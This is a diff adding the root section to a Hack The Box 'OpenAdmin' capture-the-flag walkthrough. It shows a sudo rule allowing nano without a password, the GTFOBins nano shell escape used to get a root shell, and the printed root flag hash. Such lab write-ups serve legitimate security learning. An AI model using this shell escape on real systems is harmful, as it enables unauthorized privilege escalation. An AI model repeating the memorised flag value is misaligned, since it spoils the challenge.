@@ -554,4 +554,56 @@ Awesome, now we just need the `root.txt` flag
 
 ## Root
 
+Getting root access within this box is quite easy. Let's try the same privilege escalation technics we tried with `jimmy` but now with `joanna`'s account:
+
+```bash
+joanna@openadmin:~$ sudo -l
+Matching Defaults entries for joanna on openadmin:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:
+    /usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User joanna may run the following commands on openadmin:
+    (ALL) NOPASSWD: /bin/nano /opt/priv
+joanna@openadmin:~$
+```
+
+Looks like we can run `sudo` on nano while reading the file `/opt/priv` without a password. Let's go a head attempt this privilege escalation.
+
+```bash
+GNU nano 2.9.3        /opt/priv 
+```
+
+Looks like we can run this file as root, but the file is empty. Let's look at GTFOBins to see if we can leverage a privilege escalation from nano as root.
+
+The following code can be used to break out from restricted environments by spawning an interactive system shell.
+
+```bash
+nano
+^R^X
+reset; sh 1>&0 2>&0
+```
+
+Let's try this code on OpenAdmin:
+
+```bash
+Command to execute: reset; sh 1>&0 2>&0#
+# whoami
+root
+#
+# cat /root/root.txt
+2f907ed450b361b2c2bf4e8795d5b561
+#
+```
+
+YES! We got the `root.txt` flag. Now we can review what we learned.
+
 # Additional Items
+
+Personally I think this box was a bit harder for the beginner level. I would rank this box around a `4` for difficulty. We learned the following tools/techniques.
+
+* Recon - Common Nmap and Gobuster usage
+* Exploitation - Basic Metasploit usage
+* Priv Esc - Moderate BASH enumeration to find hidden site and re-used password
+* Root Esc - Commom GTFOBins Priv Esc
+
+Now that we reviewed what we learned with this Hack The Box. Make sure you reset the Virtual Machine for the next user. Thank you for reviewing this walk-through and remember..... Happy Hacking!
